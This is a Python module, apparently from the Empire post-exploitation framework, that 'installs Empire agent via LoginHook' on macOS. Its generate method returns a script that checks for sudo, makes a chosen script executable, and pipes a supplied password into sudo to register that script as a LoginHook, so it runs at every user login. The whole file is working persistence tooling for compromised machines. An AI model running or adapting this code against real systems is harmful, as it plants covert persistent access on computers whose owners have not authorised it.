class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'LoginHook',

            # list of one or more authors for the module
            'Author': ['@Killswitch-GUI'],

            # more verbose multi-line description of the module
            'Description': ('Installs Empire agent via LoginHook.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ["https://support.apple.com/de-at/HT2420"]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'User password for sudo.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LoginHookScript' : {
                'Description'   :   'Full path of the script to be executed/',
                'Required'      :   True,
                'Value'         :   '/Users/Username/Desktop/kill-me.sh'
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        loginhookScriptPath = self.options['LoginHookScript']['Value']
        password = self.options['Password']['Value']
        password = password.replace('$', '\$')
        password = password.replace('$', '\$')
        password = password.replace('!', '\!')
        password = password.replace('!', '\!')
        script = """
import subprocess
import sys
try:
    process = subprocess.Popen('which sudo|wc -l', stdout=subprocess.PIPE, shell=True)
    result = process.communicate()
    result = result[0].strip()
    if str(result) != "1":
        print "[!] ERROR to create a LoginHook requires (sudo) privileges!"
        sys.exit()
    try:
        print " [*] Setting script to proper linux permissions"
        process = subprocess.Popen('chmod +x %s', stdout=subprocess.PIPE, shell=True)
        process.communicate()
    except Exception as e:
        print "[!] Issues setting login hook (line 81): " + str(e)

    print " [*] Creating proper LoginHook"

    try:
        process = subprocess.Popen('echo "%s" | sudo -S defaults write com.apple.loginwindow LoginHook %s', stdout=subprocess.PIPE, shell=True)
        process.communicate()
    except Exception as e:
        print "[!] Issues setting login hook (line 81): " + str(e)

    try:
        process = subprocess.Popen('echo "%s" | sudo -S defaults read com.apple.loginwindow', stdout=subprocess.PIPE, shell=True)
        print " [*] LoginHook Output: "
        result = process.communicate()
        result = result[0].strip()
        print " [*] LoginHook set to:"
        print str(result)
    except Exception as e:
        print "[!] Issue checking LoginHook settings (line 86): " + str(e)
except Exception as e:
    print "[!] Issue with LoginHook script: " + str(e)

""" % (loginhookScriptPath, password, loginhookScriptPath, password)

        return script
